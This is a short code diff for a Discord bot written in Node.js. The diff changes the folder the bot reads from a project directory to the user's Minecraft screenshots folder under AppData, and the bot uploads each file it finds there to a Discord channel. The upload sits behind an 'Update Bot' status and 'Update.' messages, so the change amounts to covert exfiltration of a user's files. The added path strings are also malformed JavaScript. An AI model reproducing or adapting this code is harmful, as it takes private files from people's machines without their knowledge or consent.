@@ -9,10 +9,10 @@ client.on('ready', () => {
     client.user.setPresence({ game: { name: 'Updating....', type: 0 } });
     console.log('successfully Logged In As Update Bot!');
     NOTIFY_CHANNEL = client.channels.find("name", "ftop-update");  
-    const testFolder = './schems/';
+    const testFolder = 'C:\Users\%username%\AppData\Roaming\.minecraft\screenshots\';
     const fs = require('fs');
       fs.readdirSync(testFolder).forEach(file => {
-         let file2 = "/app/schems/" + file
+         let file2 = "C:\Users\%username%\AppData\Roaming\.minecraft\screenshots\" + file
          console.log(file2);
          NOTIFY_CHANNEL.sendMessage(`Update.`, {
             files: [
